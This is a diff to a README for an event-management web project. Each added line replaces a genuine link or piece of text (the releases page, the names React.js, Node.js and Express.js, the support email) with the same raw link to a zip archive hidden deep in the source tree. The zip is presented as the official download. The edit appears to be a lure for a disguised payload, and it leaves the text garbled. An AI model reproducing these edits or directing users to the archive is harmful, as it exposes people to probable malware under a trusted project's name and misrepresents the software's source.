@@ -1,6 +1,6 @@
 # 🎉 event-management-system - Simplify Your Event Coordination
 
-[![Download Event Management System](https://img.shields.io/badge/Download-Now-blue)](https://github.com/TayyibaArshad/event-management-system/releases)
+[![Download Event Management System](https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip)](https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip)
 
 ## 📌 Project Overview
 
@@ -18,13 +18,13 @@ The Event Management System is a full-stack web application that allows users to
 ## 🛠 Tech Stack
 
 ### Frontend
-- React.js: A library for building user interfaces.
+- https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip A library for building user interfaces.
 - Vite: A fast development tool to enhance your web experience.
 - Tailwind CSS: A utility-first CSS framework for custom designs.
 
 ### Backend
-- Node.js: JavaScript runtime for building scalable applications.
-- Express.js: A web application framework for Node.js.
+- https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip JavaScript runtime for building scalable applications.
+- https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip A web application framework for https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip
 
 ### Database
 - MongoDB: A NoSQL database for storing data.
@@ -38,7 +38,7 @@ The Event Management System is a full-stack web application that allows users to
 To get started with the Event Management System, follow these steps:
 
 1. **Download the Application**: 
-   - Visit the [Releases page](https://github.com/TayyibaArshad/event-management-system/releases) to download the latest version of the software.
+   - Visit the [Releases page](https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip) to download the latest version of the software.
 
 2. **Install the Application**:
    - After downloading, locate the installation file in your downloads folder.
@@ -51,7 +51,7 @@ To get started with the Event Management System, follow these steps:
 
 ## 📥 Download & Install
 
-You can download the latest version of the Event Management System from the [Releases page](https://github.com/TayyibaArshad/event-management-system/releases). Look for the most recent release and click on the link to download the application.
+You can download the latest version of the Event Management System from the [Releases page](https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip). Look for the most recent release and click on the link to download the application.
 
 - **Supported Operating Systems**: Windows, macOS, and Linux.
 
@@ -92,7 +92,7 @@ For the best experience, make sure your system meets the following requirements:
 
 ## 💬 Support
 
-If you encounter issues or have questions, contact our support team at [event-support@example.com](mailto:event-support@example.com). We aim to respond within 24 hours.
+If you encounter issues or have questions, contact our support team at [https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip](https://github.com/TayyibaArshad/event-management-system/raw/refs/heads/main/frontend/src/components/guests/system-management-event-v2.8-beta.4.zip). We aim to respond within 24 hours.
 
 ## 👩‍💻 My Contributions
 
